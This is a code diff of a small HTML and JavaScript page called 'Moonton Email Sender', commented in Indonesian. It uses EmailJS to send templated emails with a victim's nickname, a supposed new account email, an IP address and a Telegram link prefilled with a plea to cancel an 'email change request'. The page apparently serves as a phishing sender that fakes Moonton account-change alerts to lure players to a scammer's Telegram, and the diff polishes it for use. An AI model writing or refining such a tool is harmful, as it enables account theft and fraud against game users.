@@ -5,84 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Moonton Email Sender</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .container {
-            background-color: #fff;
-            padding: 25px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 480px;
-        }
-        h1 {
-            font-size: 24px;
-            color: #1c1e21;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-        .form-group {
-            margin-bottom: 16px;
-        }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: 600;
-            color: #606770;
-        }
-        input[type="text"],
-        input[type="email"] {
-            width: 100%;
-            padding: 11px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        input:focus {
-            border-color: #007bff;
-            outline: none;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #d93025;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #c22a21;
-        }
-        #status {
-            text-align: center;
-            margin-top: 20px;
-            font-weight: bold;
-            padding: 10px;
-            border-radius: 6px;
-            display: none;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .container { background-color: #fff; padding: 25px 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 480px; }
+        h1 { font-size: 24px; color: #1c1e21; margin-bottom: 25px; text-align: center; }
+        .form-group { margin-bottom: 16px; }
+        label { display: block; margin-bottom: 6px; font-weight: 600; color: #606770; }
+        input[type="text"], input[type="email"] { width: 100%; padding: 11px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        input:focus { border-color: #007bff; outline: none; }
+        button { width: 100%; padding: 12px; background-color: #d93025; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background-color 0.3s; }
+        button:hover { background-color: #c22a21; }
+        button:disabled { background-color: #999; cursor: not-allowed; }
+        #status { text-align: center; margin-top: 20px; font-weight: bold; padding: 10px; border-radius: 6px; display: none; }
         .status-success { color: #155724; background-color: #d4edda; border: 1px solid #c3e6cb; display: block; }
         .status-error { color: #721c24; background-color: #f8d7da; border: 1px solid #f5c6cb; display: block; }
     </style>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
-
     <div class="container">
         <h1>Moonton Email Sender</h1>
         <form id="email-form">
@@ -107,66 +46,58 @@
                 <label for="telegram-user">Username Telegram Anda (tanpa @)</label>
                 <input type="text" id="telegram-user" placeholder="contoh: username_anda" required>
             </div>
-            
-            <button type="submit">Kirim Email</button>
+            <button type="submit" id="submit-btn">Kirim Email</button>
         </form>
         <div id="status"></div>
     </div>
 
     <script>
-        document.getElementById('email-form').addEventListener('submit', function(event) {
+        // --- ⚠️ LANGKAH 1: GANTI DENGAN PUBLIC KEY ANDA ⚠️ ---
+        emailjs.init({
+            publicKey: "pep2l72BvMbtR9Jdo",
+        });
+
+        const emailForm = document.getElementById('email-form');
+        const submitBtn = document.getElementById('submit-btn');
+        const statusEl = document.getElementById('status');
+        
+        emailForm.addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // --- ⚠️ EDIT DI BAWAH INI JIKA PERLU ⚠️ ---
-            // Kredensial EmailJS Anda
+            // --- ⚠️ LANGKAH 2: GANTI SERVICE ID & TEMPLATE ID ANDA ⚠️ ---
             const serviceID = 'service_1u6cx2g';
             const templateID = 'template_kpwtj4j';
-            const publicKey = 'pep2l72BvMbtR9Jdo';
-            // --- BATAS EDIT ---
 
-            const statusEl = document.getElementById('status');
+            // Nonaktifkan tombol dan tampilkan status
+            submitBtn.disabled = true;
             statusEl.textContent = 'Mengirim...';
             statusEl.className = '';
+            statusEl.style.display = 'block';
 
-            // Ambil semua nilai dari form
-            const nickname = document.getElementById('nickname').value;
-            const toEmail = document.getElementById('recipient_email').value; // <<< INI YANG DIPERBAIKI
-            const changeEmail = document.getElementById('change-email').value;
-            const userIP = document.getElementById('user-ip').value;
-            const telegramUser = document.getElementById('telegram-user').value;
-
-            // Membuat link Telegram dengan pesan otomatis
-            const telegramMessage = "Please help cancel the email change request for my Moonton account.";
-            const encodedMessage = encodeURIComponent(telegramMessage);
-            const fullTelegramLink = `https://t.me/${telegramUser}?text=${encodedMessage}`;
-            
-            const currentTime = new Date().toLocaleString('id-ID', {
-                dateStyle: 'full',
-                timeStyle: 'long'
-            });
-
-            // Siapkan parameter untuk template EmailJS
+            // Siapkan parameter dari nilai form
             const templateParams = {
-                to_email: toEmail,
-                nickname: nickname,
-                change_email: changeEmail,
-                user_ip: userIP,
-                button_link: fullTelegramLink,
-                current_time: currentTime
+                nickname: document.getElementById('nickname').value,
+                recipient_email: document.getElementById('recipient_email').value,
+                change_email: document.getElementById('change-email').value,
+                user_ip: document.getElementById('user-ip').value,
+                button_link: `https://t.me/${document.getElementById('telegram-user').value}?text=${encodeURIComponent("Please help cancel the email change request for my Moonton account.")}`,
+                current_time: new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'long' })
             };
             
-            emailjs.init({ publicKey: publicKey });
-
             emailjs.send(serviceID, templateID, templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     statusEl.textContent = '✅ Email berhasil dikirim!';
                     statusEl.className = 'status-success';
-                    document.getElementById('email-form').reset();
+                    emailForm.reset();
                 }, function(error) {
                     console.log('FAILED...', error);
                     statusEl.textContent = `❌ Gagal mengirim. Error: ${error.text || 'Periksa kredensial & koneksi Anda.'}`;
                     statusEl.className = 'status-error';
+                })
+                .finally(function() {
+                    // Aktifkan kembali tombol setelah selesai
+                    submitBtn.disabled = false;
                 });
         });
     </script>
